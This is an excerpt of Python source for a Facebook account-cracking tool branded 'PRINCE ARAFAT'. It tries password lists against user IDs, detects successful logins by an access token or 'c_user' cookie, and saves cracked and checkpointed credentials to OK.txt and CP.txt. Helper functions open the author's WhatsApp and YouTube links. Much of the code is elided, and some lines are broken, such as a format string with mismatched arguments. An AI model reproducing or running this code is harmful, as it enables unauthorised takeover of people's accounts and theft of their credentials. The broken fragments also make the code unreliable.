...
class __crack__:
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [PRINCE ARAFAT] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-PRINCE-ARAFAT] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-PRINCE-ARAFAT] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-PRINCE-ARAFAT] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-PRINCE-ARAFAT] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
def dupcutter():
	os.system("xdg-open https://wa.me/+8801943520447")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://youtube.com/channel/UCz9N4JuEV7AIk3V83XesTcg")
	time.sleep(3)
	readline___Public_Xml()
